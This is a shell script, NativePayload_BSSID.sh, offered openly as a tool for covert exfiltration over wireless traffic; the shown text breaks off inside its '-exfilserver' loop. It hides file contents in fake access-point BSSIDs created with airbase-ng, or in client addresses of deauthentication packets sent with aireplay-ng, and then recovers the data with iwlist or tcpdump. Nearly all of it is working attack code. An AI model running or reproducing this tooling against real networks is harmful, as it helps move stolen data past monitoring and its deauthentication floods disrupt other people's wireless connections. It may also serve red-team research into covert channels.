 #!/bin/sh
echo
echo "NativePayload_BSSID.sh v2 , Published by Damon Mohammadbagher 2017-2019" 
echo "Injecting/Downloading/Uploading DATA via BSSID (Wireless Traffic)"
echo "help syntax: ./NativePayload_BSSID.sh help"
echo

function _help () 
{
tput setaf 2
echo
echo "[@]:NativePayload_BSSID.sh $(tput setaf 11)v2$(tput setaf 2) , Published by $(tput setaf 3)Damon Mohammadbagher 2017-2019$(tput setaf 2)" 
echo "[@]:NativePayload_BSSID.sh (Internal.Commands):"
echo
tput setaf 10
echo "[@]:Client/Server Side (Internal.Commands):"
echo
tput setaf 2
printf '\u2507'; echo "$(tput setaf 11) @help $(tput setaf 2) => show all internal Commands"
printf '\u2523\u2509'; echo "Description: Help for commands"
printf '\u2516\u2509'; echo "Example:#@help"
echo
printf '\u2507'; echo "$(tput setaf 11) @exit $(tput setaf 2) => exit"
printf '\u2523\u2509'; echo "Description: exit to Console"
printf '\u2516\u2509'; echo "Example:#@exit"
echo
printf '\u2507'; echo "$(tput setaf 11) @clientmode $(tput setaf 2) or $(tput setaf 11) @cli $(tput setaf 2) => switch to client mode"
printf '\u2523\u2509'; echo "Description: switch to client mode"
printf '\u2523\u2509'; echo "Example:#@clientmode"
printf '\u2516\u2509'; echo "Example:#@cli"
echo
printf '\u2507'; echo "$(tput setaf 11) @servermode $(tput setaf 2) or $(tput setaf 11) @serv $(tput setaf 2) => switch to server mode"
printf '\u2523\u2509'; echo "Description: switch to server mode"
printf '\u2523\u2509'; echo "Example:#@servermode"
printf '\u2516\u2509'; echo "Example:#@serv"
echo
printf '\u2507'; echo "$(tput setaf 11) @clear $(tput setaf 2) => Console clear"
printf '\u2523\u2509'; echo "Description: Console clear"
printf '\u2516\u2509'; echo "Example:#@clear"
echo
printf '\u2507'; echo "$(tput setaf 11) @dbgon $(tput setaf 2) => show details : enable"
printf '\u2523\u2509'; echo "Description: show all details"
printf '\u2516\u2509'; echo "Example:#@dbgon"
echo
printf '\u2507'; echo "$(tput setaf 11) @dbgoff $(tput setaf 2) => show details : disable"
printf '\u2523\u2509'; echo "Description: Disabling details (default)"
printf '\u2516\u2509'; echo "Example:#@dbgoff"
echo
tput setaf 10
echo "[@]:Server Side (only) (Internal.Commands):"
echo
tput setaf 2
printf '\u2507'; echo "$(tput setaf 11) @bssid $(tput setaf 2) or $(tput setaf 11) bssid $(tput setaf 2) => Scanning BSSID via Iwlist (server-side) $(tput setaf 3)(Old v1 / slow)$(tput setaf 2)"
printf '\u2523\u2509'; echo "Description: Scanning BSSID on AIR via Iwlist tool to dump Exfil/Text/Data from (client-side) (default)"
printf '\u2523\u2509'; echo "Example:#@bssid"
printf '\u2516\u2509'; echo "Example:#bssid"
echo
printf '\u2507'; echo "$(tput setaf 11) @deauth $(tput setaf 2) or $(tput setaf 11) deauth $(tput setaf 2) => Attack.(Deauth) Packet Monitoring for Fake AP (server-side) $(tput setaf 3)(New v2 / very fast)$(tput setaf 2)"
printf '\u2523\u2509'; echo "Description: Monitoring WlanMon interface (Monitor-Interface) to Detect Recevied Payload via Deauth Attack Packets from Clients"
printf '\u2523\u2509'; echo "Example:#@deauth"
printf '\u2516\u2509'; echo "Example:#deauth"
echo
printf '\u2507'; echo "$(tput setaf 11) @run $(tput setaf 2) => running server side Methods [BSSID or DeAuth]"
printf '\u2523\u2509'; echo "Description: running server side Methods [BSSID or DeAuth]"
printf '\u2516\u2509'; echo "Example:#@run"

}
function killairbase
{

  sleep 10 ;
  echo
  killall airbase-ng ;

}

################################################## version 1 ##################################################
################################################## send_Bssids v1 #################################################
# ./NativePayload_BSSID.sh -f mytext.txt Fake wlan1mon0
# making fake mode (send_Bssids)
if [ $1 == "-f" ]
then
	for bytes in `xxd -p -c 5 $2 | sed 's/../&:/g'`; 
 	do
	   tput setaf 6;	
	   Exfil="${bytes::-1}"
	   text=`echo $Exfil | xxd -r -p`
	   Time=`date '+%d/%m/%Y %H:%M:%S'`	   	 
	   echo "[!]:[$Time] Injecting text: "\"$text\" "to Mac via BSSID" "[00:$Exfil]" "for FAKE AccessPoint: " $3
	   sleep 0.3
	   tput setaf 9;	
	   # Making Fake AP via airbase and Injecting Payloads to BSSIDs (MAC Address)
	   killairbase | airbase-ng -a 00:$Exfil --essid $3 -I 10 -0 $4 | grep started	 

	 done
	 Time=`date '+%d/%m/%Y %H:%M:%S'`
	 tput setaf 6;
	 echo "[>]:[$Time] Setting Finish Flag [00:ff:00:ff:00:ff] to BSSID..."
	 sleep 0.3
	 tput setaf 9;
	 killairbase | airbase-ng -a 00:ff:00:ff:00:ff --essid $3 -I 10 -0 $4 | grep started	 
fi
################################################## send_Bssids v1 #####################################
################################################## receive_Bssids v1 #####################################
# ./NativePayload_BSSID.sh -s wlan0 myExfildump.txt
# starting scan mode (dump_Bssids)
if [ $1 == "-s" ]
then
echo "Scanning Mode by \"Iwlist\" tool Started."
echo "" > $3
while true
 do
  # echo `iwlist 'wlan0' 'scan' | grep -e "Address: 00:"` >> $2 ;
  echo `iwlist $2 'scan' | grep -e "Address: 00:"` >> $3 ;
  tput setaf 9;	
  Time=`date '+%d/%m/%Y %H:%M:%S'`	 
  echo "[!]:[$Time] iwlist AP list Dumped to file: " $3;
  sleep 4.2 ;
	FinishFlag=`cat $3 | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
	if (( `echo ${#FinishFlag}` !=0 ))
	then
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	sleep 0.3
	tput setaf 7;	
	echo "[!]:[$Time] Finish flag BSSID Address Detected :" 00:ff:00:ff:00:ff
	break
	fi
 done
 tput setaf 9;	
# fold -w37 $3 > output.txt ;
Time=`date '+%d/%m/%Y %H:%M:%S'`
echo "[>] [$Time] AP List saved to" \"temp.txt\" "file"
echo

# DEBUG
# cat output.txt
fold -w37 $3 > temp.txt;
 awk {'print $5'} temp.txt > temp2Awk.txt;
 # using '!a[$0]++' is not good idea ;) sometimes.... . 
  for ops in `awk '!a[$0]++' temp2Awk.txt | xxd -p`; 
	do
	ops1=`echo $ops | xxd -r -p`
	ops2=`echo $ops | xxd -r -p | xxd -r -p`
	echo $ops1 "==>" $ops2
	done
   echo
   echo "[!] your Injected Bytes via BSSID Addresses: "
   echo
   echo `awk '!a[$0]++' temp2Awk.txt`
   echo
   echo "[!] your Text/Data: "
   echo
   ExfilString=`cat temp2Awk.txt | awk '!a[$0]++'`
   echo "${ExfilString::-17}" | xxd -r -p
   Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
   echo " " > ExfilOutput_$Timestr.txt
   echo
   echo "[>] your Text/Data saved to" \"ExfilOutput_$Timestr.txt\" "file"
   str=`echo "${ExfilString::-17}" | xxd -r -p`
   echo $str > ExfilOutput_$Timestr.txt
fi
################################################## receive_Bssids v1 #####################################
################################################## version 1 ##################################################

###################################################################################################################
###################################################################################################################
###################################################################################################################

################################################## version 2 ##################################################
################################################## send_Bssids v2 ###############################  
function sendBssids 
{
tput setaf 6;
Time=`date '+%d/%m/%Y %H:%M:%S'`
echo "[>]:[$Time] Exfiltration.via.BSSID:Started"

	for bytes in `echo "$1" | xxd -p -c 5 | sed 's/../&:/g'`; 
 	do
	  	
	   Exfil="${bytes::-1}"
	   text=`echo $Exfil | xxd -r -p`
	   Time=`date '+%d/%m/%Y %H:%M:%S'`
		if [ "$4" == "true" ]
		then
		tput setaf 10;	   	 
		echo "[!]:[$Time] Injecting text: "\"$text\" "to Mac via BSSID" "[00:$Exfil]" "for FAKE AccessPoint: " $2
		else
		tput setaf 6;
 		printf "."
		fi
		sleep 10
		tput setaf 9;	
	       	tempaddress=`echo "00:$Exfil:20:20:20:20:20:20" | head -c17`	
		killairbase | nohup airbase-ng -a $tempaddress --essid $2 -I 10 -0 $3 > "airbase_output.txt" 2>&1 &	 
	 done

	if [ "$4" == "false" ]
	then
		echo " "
	fi
 	tput setaf 10;
 	Time=`date '+%d/%m/%Y %H:%M:%S'`	  
	echo "[>]:[$Time] Setting Finish Flag [00:ff:00:ff:00:ff] to BSSID..."
	sleep 10
	
	killairbase | nohup airbase-ng -a 00:ff:00:ff:00:ff --essid $2 -I 10 -0 $3 > "airbase_output.txt" 2>&1 &
 	Time=`date '+%d/%m/%Y %H:%M:%S'`
	tput setaf 6;
 	echo "[>]:[$Time] Exfiltration.via.BSSID:Done" 
	tput setaf 2;
}
################################################## send_Bssids v2 ###############################  

################################################## receive_Bssids v2 ############################
function receiveBssids 
{
# ./NativePayload_BSSID.sh -s wlan0 myExfildump.txt
# receiveBssids  "wlan0" "myExfildump.txt" "false"
#echo "Scanning Mode by \"Iwlist\" tool Started."
Time=`date '+%d/%m/%Y %H:%M:%S'`
tput setaf 6;		   	 
echo "[>]:[$Time]:Iwlist.AP.Scanning.via.[$1]:Started"
echo "" > $2
while true
 do
  	# echo `iwlist 'wlan0' 'scan' | grep -e "Address: 00:"` >> $2 ;
  	echo `iwlist $1 'scan' | grep -e "Address: 00:"` >> $2 ;
	if [ "$3" == "true" ] 
	then
	tput setaf 10;	
	Time=`date '+%d/%m/%Y %H:%M:%S'`	 
	echo "[!]:[$Time]:Iwlist.APlist.Saving.[$2]:Done";
	else
	printf "."
	fi
  
  sleep 4.2 ;

	FinishFlag=`strings "$2" | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
	if (( `echo ${#FinishFlag}` !=0 ))
	then
		if [ "$3" == "false" ] 
		then
		echo
		fi
	sleep 0.3	
	tput setaf 6;	
	Time=`date '+%d/%m/%Y %H:%M:%S'`	
	echo "[!]:[$Time]:Finish.flag.BSSID.[00:ff:00:ff:00:ff]:Detected"
	break
	fi
 done
	
tput setaf 6;	
Time=`date '+%d/%m/%Y %H:%M:%S'`
echo "[>]:[$Time]:Iwlist.APlist.Saving.[temp.txt]:Done";

# DEBUG
# cat output.txt
tput setaf 10;	
fold -w37 $2 > temp.txt;
 awk {'print $5'} temp.txt | sed 's/00:ff:00:ff:00:ff//g' | sed 's/00:FF:00:FF:00:FF//g' | sed 's/00://g' > temp2Awk.txt;

   tput setaf 2;	
   Time=`date '+%d/%m/%Y %H:%M:%S'`
   printf "[!]:[$Time]:Injected.Bytes.[BSSID]:"
   echo `awk '!a[$0]++' temp2Awk.txt`
   ExfilString=`strings temp2Awk.txt | sed 's/00:ff:00:ff:00:ff//g' | sed 's/00:FF:00:FF:00:FF//g'| awk '!a[$0]++'  | xxd -r -p`
   tput setaf 10;
   echo "[!]:[$Time]:Dumped.[Text/Data]:$(tput setaf 11) $ExfilString"
   Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
   echo " " > "ExfilOutput_$Timestr.txt"
   str=`echo "$ExfilString" | xxd -r -p`
   echo $str > ExfilOutput_$Timestr.txt
   Time=`date '+%d/%m/%Y %H:%M:%S'`
   tput setaf 10;
   echo "[>]:[$Time]:Text.saved.[ExfilOutput_$Timestr.txt]:Done"
   tput setaf 2;	
}
################################################## receive_Bssids v2 ############################

########################################### ExfilDeauth v2 (send) ###############################  
# ExfilDeauth "up.txt" "00:11:22:33:44:55" "wlan0" "1"
# ExfilDeauth "local text file" "target AP/Fake AP BSSID" "local Wlan" "local wlan channel"
function ExfilDeauth
{
 Time=`date '+%d/%m/%Y %H:%M:%S'`
  tput setaf 6;
  echo "[>]:[$Time]:Exfiltration via Deauthentication Packets:Started"	
  tput setaf 2;	
  echo "[>]:[$Time]:Sending Deauthentication Packets via $3 by channel $4 to Default Target AP:Started"
  echo "[>]:[$Time]:Sending Deauthentication Packets to Target AP.BSSID.[00:11:22:33:44:55]:Started"
  
	`iwconfig $3 channel $4`
	Random1=`head /dev/urandom | tr -dc 0-2 | head -c1`
	id="0"

	for bytes in `echo "$1" | xxd -p -c 5 | sed 's/../&:/g'`; 
 	do
	   tput setaf 2;	
	   Exfil="${bytes::-1}"
	   text=`echo "$Exfil:20:20:20:20:20:20" | head -c17 | xxd -r -p`
	   Time=`date '+%d/%m/%Y %H:%M:%S'`

		if [ "$id" == "0" ] ;
		then
		Random1="0"
		id="1"
		elif  [ "$id" == "1" ] ;
		then
		Random1="1"
		id="2"
		elif  [ "$id" == "2" ] ;
		then
		Random1="2"
		id="3"
		elif  [ "$id" == "3" ] ;
		then
		Random1="3"
		id="4"
		elif  [ "$id" == "4" ] ;
		then
		Random1="4"
		id="5"
		elif  [ "$id" == "5" ] ;
		then
		Random1="5"
		id="6"
		elif  [ "$id" == "6" ] ;
		then
		Random1="6"
		id="7"
		elif  [ "$id" == "7" ] ;
		then
		Random1="7"
		id="8"
		elif  [ "$id" == "8" ] ;
		then
		Random1="8"
		id="9"
		elif  [ "$id" == "9" ] ;
		then
		Random1="9"
		id="a"
		elif  [ "$id" == "a" ] ;
		then
		Random1="a"
		id="b"
		elif  [ "$id" == "b" ] ;
		then
		Random1="b"
		id="c"
		elif  [ "$id" == "c" ] ;
		then
		Random1="c"
		id="d"
		elif  [ "$id" == "d" ] ;
		then
		Random1="d"
		id="e"
		elif  [ "$id" == "e" ] ;
		then
		Random1="e"
		id="f"
		elif  [ "$id" == "f" ] ;
		then
		Random1="f"
		id="0"
		fi

		tempaddress=`echo "0$Random1:$Exfil:20:20:20:20:20:20" | head -c17`
		sleep 0.2

	if [ "$5" == "true" ] 
	then	   	 		
		tput setaf 10;
		Time=`date '+%d/%m/%Y %H:%M:%S'`			
		echo "[!]:[$Time]:Injecting text: "\"$text\" "to Deauthentication Packet via" "[$tempaddress]" "for FAKE AccessPoint: " $2	 
		aireplay-ng -0 1 -a "$2" -c "$tempaddress" "$3" | grep "Sending" &
	else
		printf "."
		tput setaf 10;
		aireplay-ng -0 1 -a "$2" -c "$tempaddress" "$3" | grep "error ;)" &
	fi

	 done

	if [ "$5" == "false" ] 
	then
	echo " "
	fi
	sleep 0.1
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	echo "[>]:[$Time]:Sending Finish Flag [00:ff:00:ff:00:ff] to target AccessPoint: $2"
	aireplay-ng -0 3 -a "$2" -c "00:ff:00:ff:00:ff" "$3" | grep "error ;)" &
	wait;
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	tput setaf 6;
	echo "[!]:[$Time]:Exfiltration via Deauthentication Packets:Done"

}
########################################### ExfilDeauth v2 (send) ###############################  


########################################### ExfilDeauth v2 (receive) ############################
# ExfilDeauthDumps -dumpdeauth wlan1mon "1" 
# ExfilDeauthDumps "essid-fakev2" wlan1mon channel true
function ExfilDeauthDumps 
{

	tput setaf 2;
	FakeAp="$1"

	if [ "$1" == "" ]
	then
	FakeAp="fakev2";
	fi

	Time=`date '+%d/%m/%Y %H:%M:%S'`
	echo "[>]:[$Time]:Default AP.BSSID.[00:11:22:33:44:55]:Created"
	nohup airbase-ng -a 00:11:22:33:44:55 --essid "$FakeAp" -I 10 -0 "$2" -c "$3" > "airbase_output.txt" 2>&1 &
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	tput setaf 10;
	echo "[>]:[$Time]:Default AP.ESSID.[$FakeAp] with Wifi Channel.[$3] via $2:Started"
	tput setaf 2;
	sleep 1.5
	`nohup tcpdump -i "$2" -n | grep "DeAuthentication" > "DeauthPayloadDumps.txt" 2>&1 &`
	sleep 1
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	echo "[>]:[$Time]:$2 Packet Monitoring for DeAuthentication Traffic:Started"
	while true
	do
		if [ "$4" == "true" ]
		then
		printf '.'
		fi
	FinishFlag=`strings "DeauthPayloadDumps.txt" | grep "00:ff:00:ff:00:ff"`
		if (( `echo ${#FinishFlag}` !=0 ))
		then
 		tput setaf 6;
 		Time=`date '+%d/%m/%Y %H:%M:%S'`
		if [ "$4" == "true" ]
		then
		echo ""
		fi
		echo "[!]:[$Time]:Finish Flag:Detected"		
		break;
		fi
	sleep 3.5
	done
	`strings "DeauthPayloadDumps.txt" | awk {'print $12'} | awk '!a[$0]++' | sed "s/00:11:22:33:44:55//g" | sed 's/00:ff:00:ff:00:ff//g' | sed 's/00:FF:00:FF:00:FF//g' | sed 's/00:11:22:33:44:55//g' | sed 's/00://g' | sed 's/01://g' | sed 's/02://g' | sed 's/03://g' | sed 's/04://g' | sed 's/05://g' | sed 's/06://g' | sed 's/07://g' | sed 's/08://g' | sed 's/09://g' | sed 's/0a://g' | sed 's/0b://g' | sed 's/0c://g' | sed 's/0d://g' | sed 's/0e://g' | sed 's/0f://g' | xxd -r -p > "DeAuthbytes.txt" `
	payload=`cat DeAuthbytes.txt`
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	tput setaf 6;
	echo "[!]:[$Time]:Payload Dumping:Done"
	tput setaf 10;
	echo "[!]:[$Time]:Text/Data Dumped:$(tput setaf 11) $payload"
	nohup killall airbase-ng > "kill.txt" 2>&1 &	
	nohup killall tcpdump > "kill.txt" 2>&1 &
	tput setaf 10;	
	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
	echo " " > "ExfilOutput_$Timestr.txt"
	echo $payload > "ExfilOutput_$Timestr.txt"
	echo "[>]:[$Time]:Text/Data saved to \"ExfilOutput_$Timestr.txt\""
	tput setaf 2;
}
########################################### ExfilDeauth v2 (receive) ############################

############################### ExfilDeauth v2 (Command-based send) ############################### 
# ./NativePayload_BSSID.sh -exfildeauth text.txt "bssid" wlan1 "7"
# ./NativePayload_BSSID.sh -exfildeauth text.txt "00:11:22:33:44:55" wlan1 "7" "dbg"
if [ $1 == "-exfildeauth" ];
then
 	`iwconfig $4 channel $5`
	Random1=`head /dev/urandom | tr -dc 0-2 | head -c1`
	id="0"

	for bytes in `strings $2 | xxd -p -c 5 | sed 's/../&:/g'`; 
 	do
	   tput setaf 2;	
	   Exfil="${bytes::-1}"
	   text=`echo $Exfil | xxd -r -p`
	      	 
	   tput setaf 10;
		
		if [ "$id" == "0" ] ;
		then
		Random1="0"
		id="1"
		elif  [ "$id" == "1" ] ;
		then
		Random1="1"
		id="2"
		elif  [ "$id" == "2" ] ;
		then
		Random1="2"
		id="3"
		elif  [ "$id" == "3" ] ;
		then
		Random1="3"
		id="4"
		elif  [ "$id" == "4" ] ;
		then
		Random1="4"
		id="5"
		elif  [ "$id" == "5" ] ;
		then
		Random1="5"
		id="6"
		elif  [ "$id" == "6" ] ;
		then
		Random1="6"
		id="7"
		elif  [ "$id" == "7" ] ;
		then
		Random1="7"
		id="8"
		elif  [ "$id" == "8" ] ;
		then
		Random1="8"
		id="9"
		elif  [ "$id" == "9" ] ;
		then
		Random1="9"
		id="a"
		elif  [ "$id" == "a" ] ;
		then
		Random1="a"
		id="b"
		elif  [ "$id" == "b" ] ;
		then
		Random1="b"
		id="c"
		elif  [ "$id" == "c" ] ;
		then
		Random1="c"
		id="d"
		elif  [ "$id" == "d" ] ;
		then
		Random1="d"
		id="e"
		elif  [ "$id" == "e" ] ;
		then
		Random1="e"
		id="f"
		elif  [ "$id" == "f" ] ;
		then
		Random1="f"
		id="0"
		fi	
 		#sleep 0.1	 
		tempaddress=`echo "0$Random1:$Exfil:20:20:20:20:20:20" | head -c17`
		sleep 0.2
	if [ "$6" == "fast" ] ;
	then
		echo "$(tput setaf 2)[!]:Sending [$(tput setaf 11)"$text"$(tput setaf 2)] via DeAuth.Cli.BSSID.[$(tput setaf 3)$tempaddress$(tput setaf 2)]" "to Target AP.[$(tput setaf 3)"$3"$(tput setaf 2)]$(tput setaf 10) Done."
		aireplay-ng -0 1 -a "$3" -c $tempaddress "$4" &
		sleep 0.2
	elif  [ "$6" == "faster" ] ;
	then
		echo "$(tput setaf 2)[!]:Sending [$(tput setaf 11)"$text"$(tput setaf 2)] via DeAuth.Cli.BSSID.[$(tput setaf 3)$tempaddress$(tput setaf 2)]" "to Target AP.[$(tput setaf 3)"$3"$(tput setaf 2)]$(tput setaf 10) Done."
		aireplay-ng -0 1 -a "$3" -c $tempaddress "$4" &
		
		#if [ "$id" == "f" ];
		#then 
		#sleep 1.5
		#fi
	else
		Time=`date '+%d/%m/%Y %H:%M:%S'`
		echo "$(tput setaf 2)[!]:[$Time] Sending [$(tput setaf 11)"$text"$(tput setaf 2)] via DeAuth.Cli.BSSID.[$(tput setaf 3)$tempaddress$(tput setaf 2)]" "to Target AP.[$(tput setaf 3)"$3"$(tput setaf 2)]$(tput setaf 10) Done."
	 	sleep 0.2
		out=`aireplay-ng -0 1 -a "$3" -c $tempaddress "$4" | grep "Sending"`
		if [ "$6" == "dbg" ] ;
		then
		echo "$(tput setaf 14)$out"   
		fi
	fi

	done

	 tput setaf 6;
	 Time=`date '+%d/%m/%Y %H:%M:%S'`	
	 echo "[>]:[$Time] Sending Finish Flag [00:ff:00:ff:00:ff] to AccessPoint: $3"
	 aireplay-ng -0 1 -a "$3" -c "00:ff:00:ff:00:ff" "$4" | grep "error ;)"
 	 Time=`date '+%d/%m/%Y %H:%M:%S'`
	 echo "[>]:[$Time] Exfiltration via Deauthentication Packets Done."
fi
############################### ExfilDeauth v2 (Command-based send) ############################### 

############################### ExfilDeauth v2 (Command-based receive) ############################### 
# ExfilDeauthDumps_CmdBased "fakev2" wlan1mon channel  BSSID-optional
function ExfilDeauthDumps_CmdBased 
{
	nohup killall airbase-ng > "kill.txt" 2>&1 &	
	nohup killall tcpdump > "kill.txt" 2>&1 &
	tput setaf 2;
	FakeAp="$1";
	defaultBSSID="$4"
	if [[ "$1" == "" || "$1" == " " ]]
	then
	FakeAp="DefaultFakeAP";
	fi
	if [ "$4" == "" ]
	then
	defaultBSSID="00:11:22:33:44:55"
	fi

	Time=`date '+%d/%m/%Y %H:%M:%S'`
	echo "$(tput setaf 2)[>]:[$Time]:Default AP.BSSID.[$(tput setaf 3)$defaultBSSID$(tput setaf 2)]:$(tput setaf 10)Created$(tput setaf 2)"
	nohup airbase-ng -a "$defaultBSSID" --essid "$FakeAp" -I 10 -0 "$2" -c "$3" > "airbase_output.txt" 2>&1 &
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	echo "$(tput setaf 2)[>]:[$Time]:Default AP.ESSID.[$(tput setaf 3)$FakeAp$(tput setaf 2)] with Wifi Channel.[$(tput setaf 3)$3$(tput setaf 2)] via Interface.[$(tput setaf 3)$2$(tput setaf 2)]:$(tput setaf 10)Started$(tput setaf 2)"
	tput setaf 10;
	sleep 1.5
	out=`nohup tcpdump -i "$2" -n | grep "DeAuthentication" > "DeauthPayloadDumps.txt" &`
	sleep 1
	counter=0
	while true
	do
		Time=`date '+%d/%m/%Y %H:%M:%S'`
		echo "$(tput setaf 2)[>]:[$Time]:$(tput setaf 3)$2$(tput setaf 2) Packet Monitoring for DeAuthentication Traffic:$(tput setaf 10)Started$(tput setaf 2)"
		printf "[>]:[$Time]:$(tput setaf 3)$2$(tput setaf 2) Packet Monitoring "
		while true
		do
		tput setaf 3;
		if (( $counter > 3 ))
		then
		printf '.'
		counter=0
		fi
		tput setaf 2;
		FinishFlag=`strings "DeauthPayloadDumps.txt" | grep "00:ff:00:ff:00:ff"`
		if (( `echo ${#FinishFlag}` !=0 ))
		then
 		tput setaf 10;
 		Time=`date '+%d/%m/%Y %H:%M:%S'`
		echo ""
		echo "$(tput setaf 2)[!]:[$Time]:Finish Flag:$(tput setaf 10)Detected$(tput setaf 2)"		
		break;
		fi
		((counter++))
		sleep 3.5
		done
		# `strings "DeauthPayloadDumps.txt" | awk {'print $12'} | awk '!a[$0]++' | sed 's/00:ff:00:ff:00:ff//g' | sed 's/00:FF:00:FF:00:FF//g' | sed 's/00:11:22:33:44:55//g' | sed 's/00://g' | sed 's/01://g' | sed 's/02://g' | sed 's/03://g' | sed 's/04://g' | sed 's/05://g' | sed 's/06://g' | sed 's/07://g' | sed 's/08://g' | sed 's/09://g' | sed 's/0a://g' | sed 's/0b://g' | sed 's/0c://g' | sed 's/0d://g' | sed 's/0e://g' | sed 's/0f://g' > "DeAuthbytes1.txt" `	
		`strings "DeauthPayloadDumps.txt" | awk {'print $12'} | awk '!a[$0]++' | sed "s/$defaultBSSID//g" | sed 's/00:ff:00:ff:00:ff//g' | sed 's/00:FF:00:FF:00:FF//g' | sed 's/00:11:22:33:44:55//g' | sed 's/00://g' | sed 's/01://g' | sed 's/02://g' | sed 's/03://g' | sed 's/04://g' | sed 's/05://g' | sed 's/06://g' | sed 's/07://g' | sed 's/08://g' | sed 's/09://g' | sed 's/0a://g' | sed 's/0b://g' | sed 's/0c://g' | sed 's/0d://g' | sed 's/0e://g' | sed 's/0f://g' | xxd -r -p > "DeAuthbytes.txt" `	
		payload=`cat DeAuthbytes.txt`
		Time=`date '+%d/%m/%Y %H:%M:%S'`
		echo "$(tput setaf 2)[!]:[$Time]:Payload Dumping:$(tput setaf 10)Done$(tput setaf 2)."
		echo "$(tput setaf 2)[!]:[$Time]:Text/Data Dumped:$(tput setaf 11) $payload$(tput setaf 2)"
		nohup killall tcpdump > "kill.txt" 2>&1 &
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		echo " " > "ExfilOutput_$Timestr.txt"
		echo $payload > "ExfilOutput_$Timestr.txt"
		echo "$(tput setaf 2)[>]:[$Time]:Text/Data Saved to $(tput setaf 10)\"ExfilOutput_$Timestr.txt\"$(tput setaf 2)"
		tput setaf 2;
		sleep 0.5;
		echo "" > "DeauthPayloadDumps.txt"
		sleep 0.5;
		tput setaf 10;
		`nohup tcpdump -i "$2" -n | grep "DeAuthentication" > "DeauthPayloadDumps.txt" 2>&1 & `
	done
}
############################### ExfilDeauth v2 (Command-based receive) ###############################  

if [ $1 == "-deauthdumps" ]
then
	# ExfilDeauthDumps_CmdBased "fakev2" wlan1mon channel 
	ExfilDeauthDumps_CmdBased "$2" "$3" "$4" "$5"
fi

if [ $1 == "help" ]
then
tput setaf 2;
	echo "$(tput setaf 10)--------------------------------------------------------"
	echo "$(tput setaf 2)NativePayload_BSSID.sh$(tput setaf 11) v1 $(tput setaf 2)Syntax: "
	echo
	echo "$(tput setaf 3)Step1 (Client Side):"
	echo "$(tput setaf 2)Syntax            :$(tput setaf 10)./NativePayload_BSSID.sh -f $(tput setaf 14)[text-file] $(tput setaf 6)[Fake-AP-Name] $(tput setaf 11)[MonitorMode-Interface]"
	echo "$(tput setaf 2)Example [System A]:$(tput setaf 10)./NativePayload_BSSID.sh -f $(tput setaf 14)mytext.txt $(tput setaf 6)myfakeAP $(tput setaf 11)Wlan3mon"
	echo
	echo "$(tput setaf 3)Step2 (Server Side):"	
	echo "$(tput setaf 2)Syntax            :$(tput setaf 10)./NativePayload_BSSID.sh -s $(tput setaf 14)[Wifi-Interface] $(tput setaf 6)[Exfil-Dump-file]"
	echo "$(tput setaf 2)Example [System B]:$(tput setaf 10)./NativePayload_BSSID.sh -s $(tput setaf 14)wlan0 $(tput setaf 6)ExfilDumped.txt" 	
	echo
	echo "$(tput setaf 3)Description:$(tput setaf 2) with Step1 (system A) you will inject bytes for (mytext.txt) file to BSSID for Fake AP in this case (myfakeAP) , with Step2 on (system B) you can have this text file via Scanning Fake AP on AIR by Wireless traffic (Using iwlist tool)"
	echo "Note : before step1 you should make Monitor-Mode Interface (WlanXmon) by this command for example : $(tput setaf 10)airmon-ng start wlan3 "
	echo "$(tput setaf 10)--------------------------------------------------------"
	echo "$(tput setaf 2)NativePayload_BSSID.sh$(tput setaf 11) v2 $(tput setaf 2)Syntax I: "
	echo
	echo "$(tput setaf 3)Step1 (Server Side):"	
	echo "$(tput setaf 2)Syntax            :$(tput setaf 10)./NativePayload_BSSID.sh -deauthdumps $(tput setaf 14)[FakeAP-ESSID] $(tput setaf 6)[MonitorMode-Interface]$(tput setaf 11) [Wifi-Channel] $(tput setaf 3)[FakeAP-BSSID]"
	echo "$(tput setaf 2)Example [System B]:$(tput setaf 10)./NativePayload_BSSID.sh -deauthdumps $(tput setaf 14)MyFakeAP $(tput setaf 6)wlan1mon$(tput setaf 11) 7 $(tput setaf 3)00:12:32:44:64:19"	
	echo
	echo "$(tput setaf 3)Step2 (Client Side):"
	echo "$(tput setaf 2)Syntax            :$(tput setaf 10)./NativePayload_BSSID.sh -exfildeauth $(tput setaf 14)[text-file] $(tput setaf 6)[Target-FakeAP-BSSID] $(tput setaf 11)[Wifi-Interface] $(tput setaf 3)[Wifi-Channel] $(tput setaf 4)[dbg]/[fast]/[faster]"
	echo "$(tput setaf 2)Example [System A]:$(tput setaf 10)./NativePayload_BSSID.sh -exfildeauth $(tput setaf 14)mypayload.txt $(tput setaf 6)00:12:32:44:64:19 $(tput setaf 11)wlan2 $(tput setaf 3)7 $(tput setaf 4)faster"
	echo
	echo "$(tput setaf 3)Description:$(tput setaf 2) with Step1 (system B) you will have Fake AP via wlanXmon interface also DeAuth Packets will Dump via Tcpdump tool in this step in server side , Note: before step1 you should make WlanXmon Monitor-Mode Interface by this command : $(tput setaf 10)airmon-ng start wlanX "
	echo "$(tput setaf 2)with Step2 your Client (system A) will send that text file to (Target/system B) via DeAuth Packets On AIR Directly..."
	echo "Note: $(tput setaf 10)via Step2 your Payload Injected to Client.BSSIDs in DeAuth Packets."
	echo "$(tput setaf 10)--------------------------------------------------------"
	echo "$(tput setaf 2)NativePayload_BSSID.sh$(tput setaf 11) v2 $(tput setaf 2)Syntax II: "
	echo "$(tput setaf 3)(Server/Client Side):"	
	echo "$(tput setaf 2)Syntax :$(tput setaf 10)./NativePayload_BSSID.sh -exfilserver"
	echo "$(tput setaf 3)Description:$(tput setaf 2) for more information please read PDF/Article on Github..."
	echo "$(tput setaf 10)--------------------------------------------------------"
	
fi

	# myrecords=""
	# ChatInputArray=()
	# base64isonoff="false"
	# isb64="false"
	# iscmdshellonoff="off"
	isdebug="off"
	ExfilMode="bssid"
	server_client_Mode="server"

if [ $1 == "-exfilserver" ];
then
	
	while [ "$input" != "exit" ] 
	do 		
		while true ; 
		do

		if [ $ExfilMode == "bssid" ] ;
		then

